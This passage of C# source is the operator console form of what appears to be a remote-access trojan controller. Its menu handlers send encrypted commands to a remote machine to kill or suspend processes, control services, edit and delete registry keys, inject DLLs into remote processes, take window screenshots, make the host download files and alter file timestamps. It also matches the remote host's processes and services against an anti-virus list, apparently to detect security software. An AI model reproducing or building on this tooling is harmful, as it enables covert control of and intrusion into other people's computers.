        private void toolStripButton5_Click(object sender, EventArgs e)
        {
            TreeNode node = FindTreeNodeByFullPath(treeView1.Nodes, file_homedir);
            if (node == null)
            {
                MessageBox.Show("Unexpected null home dir node", "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else
            {
                treeView1.SelectedNode = node;
            }
        }

        //TASK - KILL
        private void toolStripMenuItem9_Click(object sender, EventArgs e)
        {
            string[] pids = listView2.SelectedItems.Cast<ListViewItem>().Select(x => x.SubItems[1].Text).ToArray();
            v.SendCommand($"task|kill|{string.Join(",", pids)}");
        }
        //TASK - KILL & DELETE
        private void toolStripMenuItem10_Click(object sender, EventArgs e)
        {
            string[] pids = listView2.SelectedItems.Cast<ListViewItem>().Select(x => x.SubItems[1].Text).ToArray();
            v.SendCommand($"task|kd|{string.Join(",", pids)}");
        }
        //TASK - Resume
        private void toolStripMenuItem11_Click(object sender, EventArgs e)
        {
            string[] pids = listView2.SelectedItems.Cast<ListViewItem>().Select(x => x.SubItems[1].Text).ToArray();
            v.SendCommand($"task|resume|{string.Join(",", pids)}");
        }

        //FILE - NEW FOLDER
        private void toolStripMenuItem24_Click(object sender, EventArgs e)
        {
            File_NewItem(true);
        }
        //FILE - NEW FILE
        private void toolStripMenuItem25_Click(object sender, EventArgs e)
        {
            File_NewItem(false);
        }

        private void menuStrip1_ItemClicked(object sender, ToolStripItemClickedEventArgs e)
        {

        }

        private void toolStripMenuItem8_Click(object sender, EventArgs e)
        {

        }

        //ZIP
        private void toolStripMenuItem26_Click(object sender, EventArgs e)
        {
            File_ArchiveFormStartup(ArchiveAction.Compress);
        }
        //UNZIP
        private void toolStripMenuItem27_Click(object sender, EventArgs e)
        {
            File_ArchiveFormStartup(ArchiveAction.Extract);
        }

        //TASK MANAGER - KEY DOWN
        private void listView2_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Modifiers == Keys.Control)
            {
                switch (e.KeyCode)
                {
                    case Keys.A:
                        foreach (ListViewItem item in listView2.Items)
                            item.Selected = true;
                        break;
                }
            }
            else
            {
                switch (e.KeyCode)
                {
                    case Keys.F5:
                        Task_ReqInit();
                        break;
                    case Keys.Delete:
                        Task_SendKill();
                        break;
                    case Keys.Enter:

                        break;
                }
            }
        }

        //REG - lv KEY DOWN
        private void listView6_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Modifiers == Keys.Control)
            {
                switch (e.KeyCode)
                {
                    case Keys.A:
                        foreach (ListViewItem item in listView6.Items)
                            item.Selected = true;
                        break;
                    case Keys.C: //Copy
                        Reg_ValueSetClipboard(true);
                        break;
                    case Keys.X: //Cut
                        Reg_ValueSetClipboard(false);
                        break;
                    case Keys.V: //Paste
                        break;
                }
            }
            else
            {
                switch (e.KeyCode)
                {
                    case Keys.F5:
                        Reg_Refresh();
                        break;
                    case Keys.Delete:
                        string[] valNames = listView6.SelectedItems.Cast<ListViewItem>().Select(x => x.Text).ToArray();
                        if (valNames.Length == 0)
                            return;

                        DialogResult dr = MessageBox.Show
                        (
                            $"Are you sure to delete {valNames.Length} value{(valNames.Length > 1 ? "s" : "")}",
                            "Delete()",
                            MessageBoxButtons.YesNo,
                            MessageBoxIcon.Question
                        );

                        if (dr == DialogResult.Yes)
                        {
                            string path = Reg_GetCurrentPath();
                            Reg_ReqValueDelete(path, valNames);
                        }

                        break;
                    case Keys.Enter:
                        //todo: Edit first value.
                        break;
                }
            }
        }

        //SERVICE - SHOW DESCRIPTION
        private void listView3_SelectedIndexChanged(object sender, EventArgs e)
        {
            try
            {
                richTextBox1.Text = listView3.SelectedItems[0].SubItems[5].Text;
            }
            catch (Exception ex)
            {

            }
        }

        //SERVICE - START
        private void toolStripMenuItem30_Click(object sender, EventArgs e)
        {
            string[] names = listView3.SelectedItems.Cast<ListViewItem>().Select(x => x.Text).ToArray();
            string b64Names = string.Join(",", names.Select(x => clsCrypto.b64E2Str(x)).ToArray());
            v.encSend(2, 0, $"serv|control|{b64Names}|Running");
        }
        //SERVICE - STOP
        private void toolStripMenuItem13_Click(object sender, EventArgs e)
        {
            string[] names = listView3.SelectedItems.Cast<ListViewItem>().Select(x => x.Text).ToArray();
            string b64Names = string.Join(",", names.Select(x => clsCrypto.b64E2Str(x)).ToArray());
            v.encSend(2, 0, $"serv|control|{b64Names}|Stopped");
        }
        //SERVICE - PAUSE
        private void toolStripMenuItem12_Click(object sender, EventArgs e)
        {
            string[] names = listView3.SelectedItems.Cast<ListViewItem>().Select(x => x.Text).ToArray();
            string b64Names = string.Join(",", names.Select(x => clsCrypto.b64E2Str(x)).ToArray());
            v.encSend(2, 0, $"serv|control|{b64Names}|Paused");
        }
        //SERVICE - RESUME
        private void toolStripMenuItem31_Click(object sender, EventArgs e)
        {
            string[] names = listView3.SelectedItems.Cast<ListViewItem>().Select(x => x.Text).ToArray();
            string b64Names = string.Join(",", names.Select(x => clsCrypto.b64E2Str(x)).ToArray());
            v.encSend(2, 0, $"serv|control|{b64Names}|Running");
        }
        //SERVICE - RESTART
        private void toolStripMenuItem32_Click(object sender, EventArgs e)
        {
            string[] names = listView3.SelectedItems.Cast<ListViewItem>().Select(x => x.Text).ToArray();
            string b64Names = string.Join(",", names.Select(x => clsCrypto.b64E2Str(x)).ToArray());
            v.encSend(2, 0, $"serv|control|{b64Names}|restart");
        }

        private void treeView6_AfterSelect(object sender, TreeViewEventArgs e)
        {
            File_ScanShortCut();
        }

        private void toolStripMenuItem34_Click(object sender, EventArgs e)
        {
            frmFileMgrExec f = new frmFileMgrExec();
            f.Text = "Start";
            f.v = v;
            f.szCurrentDir = File_GetCurrentPath();
            f.ShowDialog();
        }

        #region Registry

        //Reg - Export
        private void toolStripMenuItem36_Click(object sender, EventArgs e)
        {
            Reg_Export();
        }
        //Reg - New Key
        private void toolStripMenuItem35_Click(object sender, EventArgs e)
        {
            frmRegAddKey f = new frmRegAddKey();
            f.f_mgr = this;
            f.currentPath = (string)textBox2.Tag;
            f.v = v;
            f.Tag = Function.RegAddKey;
            f.Text = $@"Reg Add Key\\{v.ID}";

            f.ShowDialog();
        }
        //Reg - Rename Key
        private void toolStripMenuItem37_Click(object sender, EventArgs e)
        {
            TreeNode selectedNode = treeView3.SelectedNode;

            if (selectedNode == null)
                return;

            frmRegKeyRename f = new frmRegKeyRename();
            f.Text = $@"Reg Rename\\{v.ID}";
            f.f_mgr = this;
            f.keyName = selectedNode.Text;
            f.currentPath = selectedNode.Parent.FullPath;
            f.v = v;
            f.Tag = Function.RegRenameKey;
            f.Text = $@"Reg Rename Key\\{v.ID}";

            f.ShowDialog();
        }
        //Reg - Delete Key
        private void toolStripMenuItem38_Click(object sender, EventArgs e)
        {
            TreeNode selectedNode = treeView3.SelectedNode;

            if (selectedNode == null)
                return;

            DialogResult dr = MessageBox.Show(
                    "The system may become unstable, are you sure?",
                    "Reg - Delete Key",
                    MessageBoxButtons.YesNo,
                    MessageBoxIcon.Warning
                );

            if (dr != DialogResult.Yes)
                return;

            string currentPath = selectedNode.FullPath;

            new Thread(() => Reg_ReqKeyDelete(currentPath)).Start();
        }

        //Reg - New Val
        private void toolStripMenuItem39_Click(object sender, EventArgs e)
        {
            frmRegValAdd f = new frmRegValAdd();
            f.v = v;
            f.Tag = Function.RegAddValue;
            f.f_mgr = this;
            f.currentPath = (string)textBox2.Tag;
            f.Text = $@"Reg Add Value\\{v.ID}";

            f.ShowDialog();
        }
        //Reg - Edit Val
        private void toolStripMenuItem40_Click(object sender, EventArgs e)
        {
            Reg_ShowEdit();
        }
        //Reg - Rename Val
        private void toolStripMenuItem41_Click(object sender, EventArgs e)
        {
            if (listView6.SelectedItems.Count == 0)
                return;

            ListViewItem item = listView6.SelectedItems[0];

            frmRegValRename f = new frmRegValRename();
            f.v = v;
            f.Tag = Function.RegRenameValue;
            f.f_mgr = this;
            f.currentPath = (string)textBox2.Tag;
            f.oldName = item.Text;
            f.Text = $@"Reg Rename Value\\{v.ID}";
            f.ShowDialog();
        }
        //Reg - Delete Val
        private void toolStripMenuItem42_Click(object sender, EventArgs e)
        {
            string[] keyNames = listView6.SelectedItems.Cast<ListViewItem>().Select(x => x.Text).ToArray();
            string currentPath = (string)textBox2.Tag;

            new Thread(() => Reg_ReqValueDelete(currentPath, keyNames)).Start();
        }

        //Reg - Key Copy
        private void toolStripMenuItem43_Click(object sender, EventArgs e)
        {

        }
        //Reg - Key Cut
        private void toolStripMenuItem44_Click(object sender, EventArgs e)
        {

        }
        //Reg - Key Paste
        private void toolStripMenuItem45_Click(object sender, EventArgs e)
        {

        }

        //Reg - Value Copy
        private void toolStripMenuItem54_Click(object sender, EventArgs e)
        {

        }
        //Reg - Value Cut
        private void toolStripMenuItem55_Click(object sender, EventArgs e)
        {

        }
        //Reg - Value Paste
        private void toolStripMenuItem56_Click(object sender, EventArgs e)
        {

        }

        #endregion

        private void toolStripButton6_Click(object sender, EventArgs e)
        {
            File_FindStartup();
        }

        private void toolStripButton7_Click(object sender, EventArgs e)
        {
            Reg_FindStartup();
        }

        //Task - Dll Injection
        private void toolStripMenuItem33_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView2.SelectedItems)
            {
                frmTaskDLLInjector f = new frmTaskDLLInjector(v, int.Parse(item.SubItems[1].Text));
                f.Show();
            }
        }

        private void treeView3_KeyDown(object sender, KeyEventArgs e)
        {

        }



        private void richTextBox1_KeyDown(object sender, KeyEventArgs e)
        {

        }

        //File TreeView Explorer - Expand All
        private void toolStripMenuItem57_Click(object sender, EventArgs e)
        {
            treeView1.ExpandAll();
        }
        //File TreeView Explorer - Collapse All
        private void toolStripMenuItem58_Click(object sender, EventArgs e)
        {
            treeView1.CollapseAll();
        }

        //Help - Manager
        private void toolStripMenuItem47_Click(object sender, EventArgs e)
        {
            new frmBoxHelper("Function\\Manager").Show();
        }

        private void toolStripMenuItem46_Click(object sender, EventArgs e)
        {
            string szPageName = string.Empty;
            switch (tabControl1.SelectedIndex)
            {
                case 0:
                    szPageName = "FileMgr";
                    break;
                case 1:
                    szPageName = "TaskMgr";
                    break;
                case 2:
                    szPageName = "RegEdit";
                    break;
                case 3:
                    szPageName = "ServMgr";
                    break;
            }

            new frmSetting(szPageName).ShowDialog();
        }

        private void treeView2_AfterSelect(object sender, TreeViewEventArgs e)
        {

        }

        //Task - TreeView Filter
        private void textBox3_TextChanged(object sender, EventArgs e)
        {

        }
        //Task - ListView Filter
        private void textBox4_TextChanged(object sender, EventArgs e)
        {
            TextBox tb = (TextBox)sender;
            Task_RegexSearch(tb.Text);
        }

        private void listView6_DoubleClick(object sender, EventArgs e)
        {
            Reg_ShowEdit();
        }

        //Task - Suspend
        private void toolStripMenuItem48_Click(object sender, EventArgs e)
        {
            string[] pids = listView2.SelectedItems.Cast<ListViewItem>().Select(x => x.SubItems[1].Text).ToArray();
            v.SendCommand($"task|suspend|{string.Join(",", pids)}");
        }

        private void toolStripMenuItem49_Click(object sender, EventArgs e)
        {
            //Get ini config.
            SettingConfig config = clsTools.GetConfigFromINI();

            //Check json file exists.
            string szJsonFile = config.taskMgr_szAVjson;
            if (!File.Exists(szJsonFile))
            {
                MessageBox.Show("Cannot find json file: " + szJsonFile, "Not found", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            string szJsonData = File.ReadAllText(szJsonFile); //Read json file.
            Dictionary<string, string> dicAV = JsonSerializer.Deserialize<Dictionary<string, string>>(szJsonData); //Convert to dictionary.

            List<string> lsProcName = listView2.Items.Cast<ListViewItem>().Select(x => x.Text).ToList(); //Get process image name from listview.

            List<string[]> lsResult = new List<string[]>();

            //Comparison, do this in thread.
            new Thread(() =>
            {
                foreach (string szProcName in lsProcName)
                {
                    foreach (string szAvName in dicAV.Keys)
                    {
                        string szAvProcName = dicAV[szAvName];
                        if (string.Equals(szProcName, szAvProcName, StringComparison.OrdinalIgnoreCase))
                        {
                            lsResult.Add(new string[] { szAvName, szAvProcName });
                        }
                    }
                }

                //Show result.
                Invoke(new Action(() =>
                {
                    frmListView f = new frmListView(new string[] { "ImageName", "Anti-Virus" });
                    f.Text = "Anti-Virus Matched List";
                    f.Show();

                    f.ShowInfo(lsResult);
                }));

            }).Start();
        }

        private void toolStripMenuItem14_Click(object sender, EventArgs e)
        {
            //Get ini config.
            SettingConfig config = clsTools.GetConfigFromINI();

            //Check json file exists.
            string szJsonFile = config.servMgr_szAVjson;
            if (!File.Exists(szJsonFile))
            {
                MessageBox.Show("Cannot find json file: " + szJsonFile, "Not found", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            string szJsonData = File.ReadAllText(szJsonFile); //Get json file data.
            Dictionary<string, string> dicAV = JsonSerializer.Deserialize<Dictionary<string, string>>(szJsonData); //Convert json data tp dictionary.

            //Get service name and display name from listview.
            List<string> lsServName = listView3.Items.Cast<ListViewItem>().Select(x => x.Text).ToList();
            List<string> lsServDisplayName = listView3.Items.Cast<ListViewItem>().Select(x => x.SubItems[1].Text).ToList();

            List<string[]> lsResult = new List<string[]>();

            //Comparison, do in thread.
            new Thread(() =>
            {
                foreach (string szAvServName in dicAV.Keys)
                {
                    for (int i = 0; i < lsServName.Count; i++)
                    {
                        if (string.Equals(dicAV[szAvServName], lsServName[i], StringComparison.OrdinalIgnoreCase)
                            || string.Equals(dicAV[szAvServName], lsServDisplayName[i], StringComparison.OrdinalIgnoreCase)
                            || string.Equals(szAvServName, lsServDisplayName[i], StringComparison.OrdinalIgnoreCase)
                            || string.Equals(szAvServName, lsServName[i], StringComparison.OrdinalIgnoreCase)
                        )
                        {
                            lsResult.Add(new string[] { szAvServName, dicAV[szAvServName] });
                        }
                    }
                }

                //Display result.
                Invoke(new Action(() =>
                {
                    frmListView f = new frmListView(new string[] { "ServiceName", "Anti-Virus" });
                    f.Text = "Matched Anti-Virus";
                    f.Show();

                    f.ShowInfo(lsResult);
                }));

            }).Start();
        }

        //Serv - Filter
        private void textBox5_TextChanged(object sender, EventArgs e)
        {
            TextBox tb = (TextBox)sender;
            Serv_RegexSearch(tb.Text);
        }

        private void toolStripMenuItem50_Click(object sender, EventArgs e)
        {

        }

        private void toolStripMenuItem51_Click(object sender, EventArgs e)
        {
            ListViewItem[] items = listView5.SelectedItems.Cast<ListViewItem>().ToArray();
            if (items.Length == 0)
                return;

            ListViewItem item = items[0];
            string szPID = item.SubItems[3].Text;
            ListViewItem[] findItems = listView2.Items.Cast<ListViewItem>().Where(x => string.Equals(szPID, x.SubItems[1].Text)).ToArray();

            if (findItems.Length > 0)
            {
                tabControl1.SelectedIndex = 1;
                listView2.Focus();
                findItems[0].Selected = true;
                findItems[0].EnsureVisible();
            }
            else
            {
                MessageBox.Show("Cannot find PID: " + szPID, "Not found", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        //Capture - GetDC
        private void toolStripMenuItem52_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView5.SelectedItems[0];
            v.SendCommand($"window|shot|api|{item.SubItems[4].Text}");
        }
        //Capture - SetForeground
        private void toolStripMenuItem53_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView5.SelectedItems[0];
            v.SendCommand($"window|shot|fore|{item.SubItems[4].Text}");
        }

        private void listView5_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Modifiers == Keys.Control)
            {

            }
            else
            {
                if (e.KeyCode == Keys.F5)
                {
                    Window_ReqInit();
                }
            }
        }

        //File - WGET
        private void toolStripMenuItem59_Click(object sender, EventArgs e)
        {
            frmFileWGET f = new frmFileWGET();
            f.v = v;
            f.szCurrentDir = File_GetCurrentPath();
            f.Tag = Function.FileWGET;
            f.Text = @$"Wget\\{v.ID}";

            f.Show();
        }

        //Connection - Export
        private void toolStripMenuItem15_Click(object sender, EventArgs e)
        {
            SaveFileDialog sfd = new SaveFileDialog();
            sfd.FileName = clsTools.GenerateFileName("txt");
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                try
                {
                    using (FileStream fs = new FileStream(sfd.FileName, FileMode.Open, FileAccess.Write))
                    {
                        using (StreamWriter sw = new StreamWriter(fs))
                        {
                            sw.WriteLine(string.Join(",", listView4.Columns.Cast<ColumnHeader>().Select(x => x.Text)));

                            foreach (ListViewItem item in listView4.Items)
                            {
                                sw.WriteLine(string.Join(",", item.SubItems.Cast<ListViewItem.ListViewSubItem>().Select(x => x.Text)));
                            }
                        }
                    }

                    MessageBox.Show("Save file successfully.", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, "Save file error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        //Connection - copy local host
        private void toolStripMenuItem61_Click(object sender, EventArgs e)
        {
            List<ListViewItem> lsItem = listView4.SelectedItems.Cast<ListViewItem>().ToList();
            string szData = string.Join(",", lsItem.Select(x => $"{x.SubItems[1].Text}:{x.SubItems[2].Text}"));

            Clipboard.SetText(szData);
        }
        //Connection - copy remote host
        private void toolStripMenuItem62_Click(object sender, EventArgs e)
        {
            List<ListViewItem> lsItem = listView4.SelectedItems.Cast<ListViewItem>().ToList();
            string szData = string.Join(",", lsItem.Select(x => $"{x.SubItems[3].Text}:{x.SubItems[4].Text}"));

            Clipboard.SetText(szData);
        }

        //Window - copy title
        private void toolStripMenuItem64_Click(object sender, EventArgs e)
        {
            if (listView5.SelectedItems.Count == 0)
                return;

            Clipboard.SetText(listView5.SelectedItems[0].SubItems[1].Text);
        }
        //Window - copy file name
        private void toolStripMenuItem65_Click(object sender, EventArgs e)
        {
            if (listView5.SelectedItems.Count == 0)
                return;

            Clipboard.SetText(listView5.SelectedItems[0].SubItems[2].Text);
        }
        //Window - copy pid
        private void toolStripMenuItem67_Click(object sender, EventArgs e)
        {
            if (listView5.SelectedItems.Count == 0)
                return;

            Clipboard.SetText(listView5.SelectedItems[0].SubItems[3].Text);
        }
        //Window - copy handle
        private void toolStripMenuItem68_Click(object sender, EventArgs e)
        {
            if (listView5.SelectedItems.Count == 0)
                return;

            Clipboard.SetText(listView5.SelectedItems[0].SubItems[4].Text);
        }
        //Window - copy path
        private void toolStripMenuItem66_Click(object sender, EventArgs e)
        {
            if (listView5.SelectedItems.Count == 0)
                return;

            Clipboard.SetText(listView5.SelectedItems[0].SubItems[5].Text);
        }

        //Window - thread suspend
        private void toolStripMenuItem70_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView5.SelectedItems)
            {
                int nHandle = int.Parse(item.SubItems[3].Text);
                v.SendCommand($"thread|suspend|{nHandle}");
            }
        }
        //Window - thread resume
        private void toolStripMenuItem71_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView5.SelectedItems)
            {
                int nHandle = int.Parse(item.SubItems[3].Text);
                v.SendCommand($"thread|resume|{nHandle}");
            }
        }

        #endregion

        private void toolStripMenuItem72_Click(object sender, EventArgs e)
        {
            string szCurrentPath = File_GetCurrentPath();

            foreach (ListViewItem item in listView1.SelectedItems)
            {
                bool bFile = fnItemIsFile(item);
                string szFileName = item.Text;

                frmFileDatetime f = new frmFileDatetime(v, szCurrentPath, szFileName, bFile);
                f.Show();
            }
        }

        private void toolStripMenuItem73_Click(object sender, EventArgs e)
        {
            List<string> lEntity = listView1.SelectedItems.Cast<ListViewItem>().Select(x => ((object[])x.Tag)[0].ToString()).ToList();
            Clipboard.SetText(string.Join("\n", lEntity));
            MessageBox.Show($"Count: {lEntity.Count}", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void toolStripMenuItem74_Click(object sender, EventArgs e)
        {
            List<string> lPath = listView1.SelectedItems.Cast<ListViewItem>()
                .Select(x => File_GetItemObj(x))
                .Where(x => x[1] == "f")
                .Select(x => x[0])
                .ToList();

            if (lPath.Count == 0)
                return;
            else if (lPath.Count > 1)
                MessageBox.Show("More then one file, this tool will choose the first file automatically.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);

            frmFileShortCut f = new frmFileShortCut(v, File_GetCurrentPath(), lPath[0]);
            f.Text = "Create ShortCut";

            f.Show();
        }

        private void frmManager_FormClosed(object sender, FormClosedEventArgs e)
        {
            v.m_listener.ReceivedDecoded -= fnRecv;
        }
    }
}
